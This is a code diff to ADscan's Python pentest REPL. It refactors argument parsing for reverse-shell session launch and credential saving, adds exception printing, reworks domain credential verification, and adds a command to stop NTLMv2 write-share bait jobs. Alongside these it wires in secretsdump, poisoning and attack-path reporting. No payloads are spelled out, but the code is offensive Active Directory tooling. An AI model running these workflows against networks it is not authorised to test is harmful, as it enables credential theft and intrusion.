+            if len(launch_tokens) in (5, 6):
+                launch_namespace = argparse.Namespace(
+                    service=launch_tokens[0],
+                    host=launch_tokens[1],
+                    domain=launch_tokens[2],
+                    username=launch_tokens[3],
+                    password=launch_tokens[4],
+                    os=launch_tokens[5] if len(launch_tokens) == 6 else None,
                 )
+            else:
+                launch_parser = ReplArgumentParser(prog="session launch", add_help=False)
+                launch_parser.add_argument("--service", required=True, choices=["smb", "winrm"])
+                launch_parser.add_argument("--host", required=True)
+                launch_parser.add_argument("-d", "--domain", required=True)
+                launch_parser.add_argument("-u", "--username", required=True)
+                launch_parser.add_argument("-p", "--password", required=True)
+                launch_parser.add_argument("--os", dest="os", default=None, choices=["windows", "linux"])
+                launch_namespace = parse_command_args(
+                    tokens_source=" ".join(launch_tokens),
+                    legacy_field_order=(),  # never matches (5/6 already handled above); forces the flag parser for every other count
+                    parser=launch_parser,
+                    usage=launch_usage,
+                )
+            if launch_namespace is None:
+                print_error(f"Usage: {launch_usage}")
                 return
 
-            service = sub_args[0].lower()
+            service = str(launch_namespace.service).lower()
             if service not in {"smb", "winrm"}:
                 print_error("Only 'smb' and 'winrm' services are supported for now.")
                 return
 
-            host = sub_args[1]
-            domain = sub_args[2]
-            username = sub_args[3]
-            password = sub_args[4]
+            host = launch_namespace.host
+            domain = launch_namespace.domain
+            username = launch_namespace.username
+            password = launch_namespace.password
             target_os = (
-                sub_args[5].lower()
-                if len(sub_args) >= 6
+                str(launch_namespace.os).lower()
+                if launch_namespace.os
                 else ("windows" if service in {"smb", "winrm"} else "linux")
             )
             if target_os not in {"windows", "linux"}:
@@ -12239,6 +12549,7 @@ class PentestShell:
                     )
                 except Exception as exc:  # pragma: no cover - defensive
                     telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
                     print_warning_debug(
                         f"[session launch] Python agent capability check failed: {exc}"
                     )
@@ -12297,6 +12608,7 @@ class PentestShell:
                                 )
                             except Exception as exc:  # pragma: no cover - defensive
                                 telemetry.capture_exception(exc)
+                                print_exception(exception=exc)
                                 upload_ok = False
                                 print_warning_debug(
                                     "[session launch] Failed to upload "
@@ -12366,6 +12678,7 @@ class PentestShell:
                 os.makedirs(log_dir, exist_ok=True)
             except OSError as exc:
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_warning(
                     f"Failed to create log directory '{log_dir}': {exc}. "
                     "Using relative log path."
@@ -12403,6 +12716,7 @@ class PentestShell:
                     self.do_sync_clock_with_pdc(domain, verbose=True)
             except Exception as exc:  # pragma: no cover - defensive
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_warning_debug(
                     f"Clock sync before reverse shell launch failed: {exc}"
                 )
@@ -12462,6 +12776,7 @@ class PentestShell:
                         )
                 except Exception as exc:  # pragma: no cover - defensive
                     telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
                     print_warning_debug(
                         f"[session launch] Failed to collect NetExec output for "
                         f"command '{cmd[:120]}...': {exc}"
@@ -12554,6 +12869,7 @@ class PentestShell:
                             )
                     except Exception as exc:  # pragma: no cover - defensive
                         telemetry.capture_exception(exc)
+                        print_exception(exception=exc)
                         print_warning_debug(
                             "Reverse shell session received but automatic "
                             f"agent attachment failed: {exc}"
@@ -13000,6 +13316,7 @@ class PentestShell:
                     ip_to_iface[ip] = iface
         except Exception as exc:  # pragma: no cover - defensive
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_error_debug(
                 f"Failed to enumerate local interfaces for payload generation: {exc}"
             )
@@ -13059,6 +13376,7 @@ class PentestShell:
             )
         except Exception as exc:  # pragma: no cover - defensive
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_warning_debug(
                 f"[session launch] Remote Python probe error: {exc}. "
                 "Falling back to non-agent payload."
@@ -13176,6 +13494,7 @@ class PentestShell:
                 current_session = self.session_manager.get_current_session()
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             current_session = None
         if current_session is not None:
             prompt_text.append("@", style="white")
@@ -13216,6 +13535,7 @@ class PentestShell:
             prompt_text.append(display_cwd, style="bold magenta")  # CWD style
         except OSError as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             # In case getcwd fails, e.g., directory deleted
             if has_ws_or_domain:
                 prompt_text.append(" ", style="white")
@@ -13242,6 +13562,7 @@ class PentestShell:
                 display_cwd = cwd
         except OSError as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             display_cwd = "[unknown path]"
 
         # Using prompt_toolkit's HTML for styling.
@@ -13278,6 +13599,7 @@ class PentestShell:
             return list(psutil.net_if_addrs().keys())
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             # self.console.print(f"[dim]Could not fetch interfaces: {e}[/dim]") # Optional debug
             return []
 
@@ -13342,6 +13664,7 @@ class PentestShell:
             flush_deferred_background_console()
         except Exception as exc:  # noqa: BLE001 -- a flush failure must not break the loop
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
         if bool(getattr(self, "is_sub_prompt_active", False)):
             return
         # Loop-free guard (belt-and-suspenders). The drain can run an interactive
@@ -13370,6 +13693,7 @@ class PentestShell:
             self._dispatch_background_job_results(results)
         except Exception as exc:  # noqa: BLE001 — notification flush must never break the loop
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
 
     def _consume_background_drain_sentinel(self, user_input) -> bool:
         """Handle the idle-wake sentinel returned by ``session.prompt``.
@@ -13446,11 +13770,13 @@ class PentestShell:
             print_info_debug(f"crack-drain: dispatching total={len(results)} kinds={kinds}")
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
         for kind, kind_results in by_kind.items():
             try:
                 renderers[kind](kind_results)
             except Exception as exc:  # noqa: BLE001 — one renderer must not break others
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
         if fallback:
             self._render_background_notification_line(fallback)
 
@@ -13507,6 +13833,7 @@ class PentestShell:
             self._background_wake_hook_registered = True
         except Exception as exc:  # noqa: BLE001 — wake registration is best-effort
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
 
     def _current_foreground_state(self):
         """Return the foreground-state SSOT for the idle-wake gate.
@@ -13565,6 +13892,7 @@ class PentestShell:
             )
         except Exception as exc:  # noqa: BLE001 — the wake hook must never raise
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
 
     def _render_harvest_review_at_drain(self, newly_cracked_usernames) -> None:
         """Render the harvest review at this foreground-safe drain (best-effort).
@@ -13596,6 +13924,7 @@ class PentestShell:
             )
         except Exception as exc:  # noqa: BLE001 — the review render must never break the loop
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
 
     def _persist_cracking_job_harvest(self, cracking_results) -> list:
         """Persist ``HarvestedPrincipal`` records for drained cracking results.
@@ -13651,6 +13980,7 @@ class PentestShell:
                 )
             except Exception as log_exc:  # noqa: BLE001
                 telemetry.capture_exception(log_exc)
+                print_exception(exception=log_exc)
             usernames = [
                 str(r.detail.get("user") or "")
                 for r in cracking_results
@@ -13712,9 +14042,11 @@ class PentestShell:
                 )
             except Exception as log_exc:  # noqa: BLE001
                 telemetry.capture_exception(log_exc)
+                print_exception(exception=log_exc)
             return cracked_users
         except Exception as exc:  # noqa: BLE001 — harvest persist must never break the loop
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             # crack-persist: greppable, --debug-only. A swallowed persist failure
             # here leaves the harvest store empty despite a drained cracked result
             # (the exact class of bug that made a real crack "vanish"); surface it
@@ -13753,28 +14085,24 @@ class PentestShell:
         os.makedirs(os.path.dirname(desired_history_path), exist_ok=True)
         return desired_history_path, session_factory(desired_history_path)
 
-    def run(self):
-        """Main loop for the interactive shell using prompt-toolkit."""
-        if not self.current_workspace:
-            print_panel(
-                "[bold]ADscan cannot enter the interactive shell without an active workspace.[/bold]\n\n"
-                "Start the session again and select or create a workspace first.\n\n"
-                "[dim]This guardrail prevents partial failures later when commands try to save "
-                "credentials, domain state, or artifacts into workspace-scoped paths.[/dim]",
-                title="[bold]Workspace Required[/bold]",
-                border_style="red",
-                padding=(1, 2),
-            )
-            print_warning(
-                "Interactive shell not started because no workspace is active."
-            )
-            return
+    def _build_completer_dict(self) -> Dict[str, Any]:
+        """Build the ``cmd_stem -> Completer`` mapping for the REPL's ``NestedCompleter``.
 
-        history_path = self._resolve_prompt_history_path_for_workspace(
-            self.current_workspace_dir
-        )
-        os.makedirs(os.path.dirname(history_path), exist_ok=True)
+        Extracted from :meth:`run` (Phase 2 Task 20,
+        ``docs/superpowers/plans/2026-07-21-repl-flag-argument-grammar.md``)
+        so it is independently testable without constructing a live
+        ``PromptSession``. Pure function of ``self`` — no side effects
+        beyond reading ``self.commands`` and inspecting each registered
+        ``do_*`` method.
 
+        A command whose stem is registered in
+        ``adscan_internal.cli.repl_completion.FLAG_COMPLETION_SPECS``
+        (``get_flags``, ``dcsync``, and future flag-grammar migrations)
+        short-circuits onto :class:`FlagAwareCompleter` BEFORE the legacy
+        domain/credential/auto-detect heuristics below ever run for it.
+        Every other command stem falls through to those heuristics exactly
+        as it did before this method existed.
+        """
         set_variables = [
             "hosts",
             "myip",
@@ -13889,6 +14217,16 @@ class PentestShell:
             cmd_stem
         ) in self.commands.keys():  # cmd_stem is 'asreproast', 'spraying', 'cd', etc.
             if cmd_stem not in completer_dict:  # completer_dict keys are also stems
+                if cmd_stem in FLAG_COMPLETION_SPECS:
+                    # Migrated flag-grammar command (get_flags, dcsync, ...):
+                    # order-independent, bidirectional completion short-circuits
+                    # here, BEFORE the legacy domain/credential/auto-detect
+                    # heuristics below ever run for it.
+                    completer_dict[cmd_stem] = FlagAwareCompleter(
+                        self, FLAG_COMPLETION_SPECS[cmd_stem]
+                    )
+                    continue
+
                 actual_method_name = "do_" + cmd_stem  # e.g., 'do_asreproast'
                 apply_domain_completer = False
                 apply_credential_completer = False
@@ -13918,6 +14256,7 @@ class PentestShell:
                                     apply_credential_completer = True
                     except Exception as e:
                         telemetry.capture_exception(e)
+                        print_exception(exception=e)
                         pass  # Ignore errors during inspection
 
                 # Assign completer to the command stem key
@@ -13964,8 +14303,34 @@ class PentestShell:
                             completer_dict[cmd_stem] = None
                     except Exception as e:
                         telemetry.capture_exception(e)
+                        print_exception(exception=e)
                         completer_dict[cmd_stem] = None  # Fallback on error
 
+        return completer_dict
+
+    def run(self):
+        """Main loop for the interactive shell using prompt-toolkit."""
+        if not self.current_workspace:
+            print_panel(
+                "[bold]ADscan cannot enter the interactive shell without an active workspace.[/bold]\n\n"
+                "Start the session again and select or create a workspace first.\n\n"
+                "[dim]This guardrail prevents partial failures later when commands try to save "
+                "credentials, domain state, or artifacts into workspace-scoped paths.[/dim]",
+                title="[bold]Workspace Required[/bold]",
+                border_style="red",
+                padding=(1, 2),
+            )
+            print_warning(
+                "Interactive shell not started because no workspace is active."
+            )
+            return
+
+        history_path = self._resolve_prompt_history_path_for_workspace(
+            self.current_workspace_dir
+        )
+        os.makedirs(os.path.dirname(history_path), exist_ok=True)
+
+        completer_dict = self._build_completer_dict()
         command_completer = NestedCompleter.from_nested_dict(completer_dict)
 
         kb = KeyBindings()
@@ -14058,6 +14423,7 @@ class PentestShell:
                             # else: it will use the default_prompt_text
                         except Exception as e:
                             telemetry.capture_exception(e)
+                            print_exception(exception=e)
                             # Log error if needed, and fall back to default
                             # self.console.print(f"Error getting rich prompt: {e}", style="dim red")
                             pass  # Fallback to default_prompt_text
@@ -14135,6 +14501,7 @@ class PentestShell:
                     parts = shlex.split(user_input)
                 except ValueError as e:
                     telemetry.capture_exception(e)
+                    print_exception(exception=e)
                     print_warning("Error: Mismatched quotes in input.")
                     continue
 
@@ -14298,6 +14665,31 @@ class PentestShell:
                     print_warning(
                         f"Unknown command: {_rich_escape(command_name)}"
                     )
+                    # Category-name recovery (checked FIRST): a new user often
+                    # types a command CATEGORY name (`smb`, `domain`, `acl`)
+                    # expecting to see its commands. That is not a command, so
+                    # it would otherwise fall through to the generic message and
+                    # the user leaves. An exact (case-insensitive) match against
+                    # the help-tree category names is a strong signal — prefer it
+                    # over the fuzzy command match, which for a bare category name
+                    # is usually a coincidental near miss.
+                    try:
+                        _help_tree, _ = self._build_help_tree()
+                        _category_by_lower = {
+                            _cat.lower(): _cat for _cat in _help_tree.keys()
+                        }
+                    except Exception:
+                        _category_by_lower = {}
+
+                    _matched_category = _category_by_lower.get(command_name.lower())
+                    if _matched_category is not None:
+                        print_info(
+                            f"'{_rich_escape(_matched_category)}' is a command "
+                            f"category, not a command. Type "
+                            f"`help {_matched_category}` to list its commands."
+                        )
+                        continue
+
                     # Did-you-mean recovery: fuzzy-match the unknown token
                     # against the registered REPL commands so a near miss
                     # (`cve` → `cves`, `serach` → `search`) gets a one-line
@@ -15104,16 +15496,40 @@ class PentestShell:
             else:
                 print_instruction("Usage: creds select <domain_name>")
         elif command == "save":
-            if len(command_parts) < 4:
-                print_instruction(
-                    "Usage: creds save <domain_name> <username> <credential> [host] [service]"
+            from adscan_internal.cli.repl_args import ReplArgumentParser, parse_command_args
+
+            usage = (
+                "creds save <domain_name> <username> <credential> [host] [service]  |  "
+                "creds save -d <domain> -u <username> -p <credential> [--host <host> --service <service>]"
+            )
+            legacy_field_order = ("domain", "username", "credential")
+            save_tokens = command_parts[1:]
+            if len(save_tokens) == 3:
+                domain, user, cred = save_tokens
+                host = service = None
+            elif len(save_tokens) == 5:
+                domain, user, cred, host, service = save_tokens
+            else:
+                save_args = " ".join(command_parts[1:])
+                save_parser = ReplArgumentParser(prog="creds save", add_help=False)
+                save_parser.add_argument("-d", "--domain", required=True)
+                save_parser.add_argument("-u", "--username", required=True)
+                save_parser.add_argument("-p", "--credential", required=True)
+                save_parser.add_argument("--host", default=None)
+                save_parser.add_argument("--service", default=None)
+                namespace = parse_command_args(
+                    tokens_source=save_args,
+                    legacy_field_order=legacy_field_order,  # never matches len==5; forces the flag branch above for that count too
+                    parser=save_parser,
+                    usage=usage,
                 )
-                return
-            domain = command_parts[1]
-            user = command_parts[2]
-            cred = command_parts[3]
-            host = command_parts[4] if len(command_parts) > 4 else None
-            service = command_parts[5] if len(command_parts) > 5 else None
+                if namespace is None:
+                    print_instruction(f"Usage: {usage}")
+                    return
+                domain, user, cred, host = (
+                    namespace.domain, namespace.username, namespace.credential, namespace.host
+                )
+                service = namespace.service
             is_local_target = bool(host and service)
             if not ensure_domain_ready_for_manual_credential_save(
                 self,
@@ -15577,47 +15993,60 @@ class PentestShell:
         self._last_verified_domain_name = None
         self._last_verified_domain_username = None
         self._last_verified_domain_credential = None
+        # Distinguishes a SKIPPED verification (DC IP unknown → credential
+        # retained UNVERIFIED but still usable) from a failed one, so the
+        # downstream keep/purge messaging (creds.py) never implies a usable
+        # credential is unusable.
+        self._last_domain_credential_verification_skipped = False
 
-        # Safely get PDC information, handling case when it doesn't exist
+        # Resolve the DC/KDC IP via the SSOT fallback chain
+        # (pdc → dc_ip → dcs[0] → connectivity.summary.pdc_ip). Reading
+        # domain_data["pdc"] directly drops a cross-domain-discovered
+        # credential whose 'pdc' key is None even though the DC IP is known
+        # everywhere else (DNS, DCSync) — the exact anti-pattern CLAUDE.md
+        # forbids. Mirrors the sibling in
+        # _maybe_change_password_after_must_change.
+        from adscan_internal.models.domain import (
+            resolve_dc_fqdn as _resolve_dc_fqdn,
+            resolve_dc_ip as _resolve_dc_ip,
+        )
+
         domain_data = self.domains_data.get(domain_name, {})
-        pdc_host = domain_data.get("pdc")
+        pdc_host = _resolve_dc_ip(domain_data)
         pdc_hostname = domain_data.get("pdc_hostname")
 
-        if not pdc_host or not pdc_hostname:
+        if not pdc_host:
+            # The DC/KDC IP genuinely cannot be resolved — verification is
+            # SKIPPED, NOT failed. A recovered NT hash / cracked password is
+            # retained UNVERIFIED and stays usable; flag it so the keep/purge
+            # messaging reports "skipped", not "password change required".
+            self._last_domain_credential_verification_skipped = True
             marked_domain_name = mark_sensitive(domain_name, "domain")
             if not ui_silent:
-                print_error(
-                    f"PDC information not found in workspace variables for domain "
-                    f"'[bold]{marked_domain_name}[/bold]'. Cannot verify credentials."
+                print_warning(
+                    f"Cannot verify the credential for domain "
+                    f"'[bold]{marked_domain_name}[/bold]': the PDC/DC IP is unknown. "
+                    "The credential is retained UNVERIFIED (it remains usable)."
                 )
                 print_info(
-                    "Hint: Set the PDC hostname using: [cyan]set pdc_hostname <PDC_HOSTNAME>[/cyan] "
-                    "and the PDC IP with: [cyan]set pdc <PDC_IP>[/cyan]"
+                    "Hint: set the PDC IP with: [cyan]set pdc <PDC_IP>[/cyan]"
                 )
             else:
                 print_info_verbose(
-                    "[ui_silent] Missing PDC information; cannot verify credentials."
+                    "[ui_silent] PDC/DC IP unknown; verification skipped, "
+                    "credential retained unverified."
                 )
             return False
 
-        pdc_fqdn = f"{pdc_hostname}.{domain_name}"
-
-        if not pdc_hostname:
-            marked_domain_name = mark_sensitive(domain_name, "domain")
-            if not ui_silent:
-                print_error(
-                    f"PDC hostname not found in workspace variables for domain "
-                    f"'[bold]{marked_domain_name}[/bold]'. Cannot verify credentials."
-                )
-                print_info(
-                    "Hint: Set the PDC hostname using: [cyan]set pdc_hostname <PDC_HOSTNAME>[/cyan] "
-                    "and the PDC IP with: [cyan]set pdc <PDC_IP>[/cyan]"
-                )
-            else:
-                print_info_verbose(
-                    "[ui_silent] Missing PDC hostname; cannot verify credentials."
-                )
-            return False
+        # The FQDN is used only for display and the SAMR password-change SPN
+        # host — the Kerberos verification keys on the IP above. Resolve via
+        # the SSOT FQDN chain, falling back to the short hostname promoted with
+        # the domain, then the IP, so a missing hostname no longer aborts.
+        pdc_fqdn = (
+            _resolve_dc_fqdn(domain_data, target_domain=domain_name)
+            or (f"{pdc_hostname}.{domain_name}" if pdc_hostname else None)
+            or pdc_host
+        )
 
         cred_type = "Hash" if self.is_hash(cred_value) else "Password"
         if not ui_silent:
@@ -15723,6 +16152,7 @@ class PentestShell:
                     result.raw_output = None
                 except Exception as exc_tgt:  # noqa: BLE001
                     telemetry.capture_exception(exc_tgt)
+                    print_exception(exception=exc_tgt)
 
         except Exception as e:
             telemetry.capture_exception(e)
@@ -16071,6 +16501,7 @@ class PentestShell:
                 )
             except Exception as exc_recovery:  # noqa: BLE001
                 telemetry.capture_exception(exc_recovery)
+                print_exception(exception=exc_recovery)
                 print_error(
                     "Credential recovery failed; the credential was not adopted."
                 )
@@ -16153,6 +16584,7 @@ class PentestShell:
         """
         from adscan_internal.cli.smb import run_smb_scan
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_smb_scan(self, domain=domain)
 
     def do_smb_shares(self, args):
@@ -16215,6 +16647,7 @@ class PentestShell:
         """Thin wrapper → adscan_internal.cli.scan.do_unauth_scan"""
         from adscan_internal.cli.scan import do_unauth_scan as _do_unauth_scan
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return _do_unauth_scan(self, domain)
 
     def ask_for_ldap_scan(self, domain):
@@ -16353,6 +16786,7 @@ class PentestShell:
         """
         from adscan_internal.cli.domains import run_enum_trusts
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_enum_trusts(self, domain)
 
     def ask_for_search_adcs(self, domain):
@@ -16386,6 +16820,7 @@ class PentestShell:
         """Thin wrapper → adscan_internal.cli.adcs.do_search_adcs"""
         from adscan_internal.cli.adcs import do_search_adcs as _do_search_adcs
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return _do_search_adcs(self, domain)
 
     def do_show_adcs_cache(self, domain):
@@ -16394,6 +16829,7 @@ class PentestShell:
             do_show_adcs_cache as _do_show_adcs_cache,
         )
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return _do_show_adcs_cache(self, domain)
 
     def ask_for_enum_domain_auth(self, domain):
@@ -16413,12 +16849,14 @@ class PentestShell:
         """
         from adscan_internal.cli.ldap import run_enum_domain_auth
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_enum_domain_auth(self, domain)
 
     def do_enum_domain_auth_phase1(self, domain):
         """Run the authenticated enumeration up to Phase 1 only."""
         from adscan_internal.cli.ldap import run_enum_domain_auth_phase1
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_enum_domain_auth_phase1(self, domain)
 
     def run_enumeration(
@@ -16462,6 +16900,7 @@ class PentestShell:
             )
         except Exception as _migration_exc:  # noqa: BLE001
             telemetry.capture_exception(_migration_exc)
+            print_exception(exception=_migration_exc)
 
         # Professional post-collection enumeration with phased workflow.
         from adscan_internal.rich_output import print_step_status
@@ -16574,6 +17013,7 @@ class PentestShell:
                 maybe_surface_high_value_cracks_between_phases(self, domain)
             except Exception as exc:  # noqa: BLE001 — the break point is best-effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
 
         def _enter_phase(title: str) -> None:
             """Render the chapter for ``title`` and open a fresh timeline span."""
@@ -16884,6 +17324,7 @@ class PentestShell:
                 telemetry.capture("environment_enumerated", properties)
             except Exception as exc:  # pragma: no cover - best effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
 
         # MSSQL Authorization collection now runs as a Phase-2 (Domain Collection)
         # peer inside run_native_collection — AFTER the unified nmap port scan
@@ -17117,6 +17558,7 @@ class PentestShell:
                     self._render_audit_summary_panel(domain)
                 except Exception as exc:  # noqa: BLE001
                     telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
                     print_warning_debug(
                         f"[audit_summary] render failed: {type(exc).__name__}: {exc}"
                     )
@@ -17175,6 +17617,7 @@ class PentestShell:
                 )
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
 
         # Capture scan_complete event with case study metrics
         self._capture_scan_complete(domain)
@@ -17188,27 +17631,44 @@ class PentestShell:
         # Report CTA and zero-findings diagnostic after scan
         # Hormozi: CTA with "what + why now" at victory (show the stack);
         # Perceived Likelihood when 0 findings (transparency builds credibility)
-        _scan_attack_paths = getattr(self, "_session_attack_paths_count", 0)
+        # Verdict is keyed on the PERSISTED snapshot (the SSOT that
+        # ``_show_exit_summary`` also reads), never the legacy in-memory counter
+        # ``_session_attack_paths_count`` — that counter is never incremented, so
+        # keying on it falsely reported EVERY authenticated scan as "hardened"
+        # even when exploited paths existed.
         _scan_mode = getattr(self, "scan_mode", None)
-        if _scan_attack_paths > 0 and should_show_victory_hint(
-            "scan_complete_report", "subtle"
-        ):
-            _pro_url = mark_passthrough("https://adscanpro.com/pro")
+        _ap_verdict = select_attack_path_verdict(
+            get_attack_path_snapshot_metrics(self, domains=[domain]),
+            scan_mode=_scan_mode,
+        )
+        if _ap_verdict.kind == "exploited":
+            if should_show_victory_hint("scan_complete_report", "subtle"):
+                _pro_url = mark_passthrough("https://adscanpro.com/pro")
+                self.console.print()
+                print_info(
+                    f"💡 Found [bold]{_ap_verdict.total} attack path(s)[/bold] — PRO turns them into a "
+                    f"client-ready PDF (exec summary, attack chains, compliance mapping) "
+                    f"in 90 seconds → {_pro_url}"
+                )
+                mark_victory_hint_shown("scan_complete_report")
+        elif _ap_verdict.kind == "identified_unvalidated":
+            # Paths exist but none were proven end-to-end. Honest wording that
+            # mirrors the exit summary — NEVER "hardened" (theoretical/blocked/
+            # unsupported paths are exposure, not evidence of a defence).
             self.console.print()
             print_info(
-                f"💡 Found [bold]{_scan_attack_paths} attack path(s)[/bold] — PRO turns them into a "
-                f"client-ready PDF (exec summary, attack chains, compliance mapping) "
-                f"in 90 seconds → {_pro_url}"
+                f"[dim]{_ap_verdict.total} attack path(s) identified — "
+                f"{_ap_verdict.unvalidated} theoretical/blocked/unsupported, "
+                f"not validated end-to-end.[/dim]"
             )
-            mark_victory_hint_shown("scan_complete_report")
-        elif _scan_attack_paths == 0 and _scan_mode == "unauth":
+        elif _ap_verdict.kind == "no_paths" and _scan_mode == "unauth":
             self.console.print()
             print_info(
                 "[dim]No attack paths found in unauthenticated mode — expected without credentials.\n"
                 "→ Scan the authenticated attack surface: "
                 "[cyan]creds save <domain> <user> <pass>[/cyan][/dim]"
             )
-        elif _scan_attack_paths == 0 and _scan_mode == "auth":
+        elif _ap_verdict.kind == "no_paths" and _scan_mode == "auth":
             self.console.print()
             print_info(
                 "[dim]No exploitable attack paths detected. "
@@ -17224,6 +17684,7 @@ class PentestShell:
             maybe_offer_post_scan_lab_confirmation(self)
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
 
         # Flush the final phase span so its timeline row + delta footer are
         # emitted. Earlier phases are closed automatically by ``_enter_phase``
@@ -17320,6 +17781,7 @@ class PentestShell:
                     report = _json_load(fh)
             except (OSError, JSONDecodeError) as exc:
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 report = None
             if isinstance(report, dict):
                 findings_root = (
@@ -17579,6 +18041,7 @@ class PentestShell:
             telemetry.capture("scan_complete", properties)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
 
     def ask_for_enum_configs(self, domain):
         """Thin wrapper → adscan_internal.cli.enum.ask_for_enum_configs"""
@@ -17592,12 +18055,14 @@ class PentestShell:
         """Thin wrapper → adscan_internal.cli.enum.do_enum_configs"""
         from adscan_internal.cli.enum import do_enum_configs as _do_enum_configs
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return _do_enum_configs(self, domain)
 
     def do_dc_access(self, domain):
         """Wrapper for run_dc_access - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_dc_access
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_dc_access(self, domain)
 
     def execute_dc_access(
@@ -17612,6 +18077,7 @@ class PentestShell:
         """Wrapper for run_krbtgt - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_krbtgt
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_krbtgt(self, domain)
 
     def execute_krbtgt(self, command, domain):
@@ -17624,18 +18090,21 @@ class PentestShell:
         """Wrapper for run_pwdneverexpires - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_pwdneverexpires
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_pwdneverexpires(self, domain)
 
     def do_passnotreq(self, domain):
         """Wrapper for run_passnotreq - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_passnotreq
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_passnotreq(self, domain)
 
     def do_stale_enabled_users(self, domain, *, stale_days: int = 180):
         """Wrapper for stale enabled user hygiene check."""
         from adscan_internal.cli.attack_graph_reports import run_stale_enabled_users
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_stale_enabled_users(self, domain, stale_days=stale_days)
 
     def do_tier0_highvalue_sprawl(self, domain):
@@ -17644,6 +18113,7 @@ class PentestShell:
             run_tier0_highvalue_sprawl,
         )
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_tier0_highvalue_sprawl(self, domain)
 
     def execute_passnotreq(
@@ -17667,6 +18137,7 @@ class PentestShell:
         """
         from adscan_internal.cli.smb import run_smb_relay_targets
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return run_smb_relay_targets(self, domain=domain)
 
     def execute_generate_relay_list(self, domain):
@@ -17716,6 +18187,7 @@ class PentestShell:
         Args:
             domain (str): The name of the domain to enumerate.
         """
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         # Posture freshness guard — convergence point for both Scenario A
         # (start_auth with explicit creds) and Scenario B (start_unauth
         # discovered creds via add_credential). Idempotent: no-op when posture
@@ -17745,6 +18217,7 @@ class PentestShell:
             from adscan_core import telemetry as _t  # noqa: PLC0415
 
             _t.capture_exception(_exc)
+            print_exception(exception=_exc)
 
         # Professional authenticated enumeration header
 
@@ -17794,6 +18267,7 @@ class PentestShell:
         Args:
             target_domain: The domain whose domain controllers to scan.
         """
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         import os
         from adscan_internal.cli.cves_native import dispatch as _dispatch_cves
         from adscan_internal.workspaces.computers import domain_subpath
@@ -17821,6 +18295,7 @@ class PentestShell:
         Args:
             target_domain: The domain whose enabled computers to scan.
         """
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         import os
         from adscan_core.rich_output import print_error
         from adscan_internal.cli.cves_native import dispatch as _dispatch_cves
@@ -18270,6 +18745,24 @@ class PentestShell:
         """Stop broadcast poisoning, whether started by a scan or the 'poisoning' command."""
         stop_poisoning(self)
 
+    def do_stop_writeshare(self, _arg):
+        """Stop write-share NTLMv2 bait job(s): remove the planted bait + free :445."""
+        from adscan_internal.services.background_jobs.scan_seam import (  # noqa: PLC0415
+            stop_writeshare_bait_jobs,
+        )
+        from adscan_core.rich_output import print_info, print_warning  # noqa: PLC0415
+
+        stopped = stop_writeshare_bait_jobs(self)
+        if not stopped:
+            print_warning("No write-share bait job is running.")
+            return
+        n = len(stopped)
+        noun = "job" if n == 1 else "jobs"
+        print_info(
+            f"Stopped {n} write-share bait {noun} ({', '.join(stopped)}); "
+            "bait removed and the shared listener released."
+        )
+
     def do_jobs(self, args):
         """List background jobs, or stop one with 'jobs stop <id>'.
 
@@ -18338,6 +18831,7 @@ class PentestShell:
             )
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
         render_harvest_command(self, domain)
 
     def do_check_ntlm_auth(self, args):
@@ -18517,6 +19011,7 @@ class PentestShell:
         """Extract NTLM hashes from local SAM/SYSTEM hives using secretsdump.py."""
         from adscan_internal.cli.dumps import run_secretsdump_registries
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return run_secretsdump_registries(self, domain=domain)
 
     def ask_for_flags(self, domain, username, password, *, secret_kind=None):
@@ -18533,7 +19028,12 @@ class PentestShell:
         """
         Obtains flags from the specified domain.
 
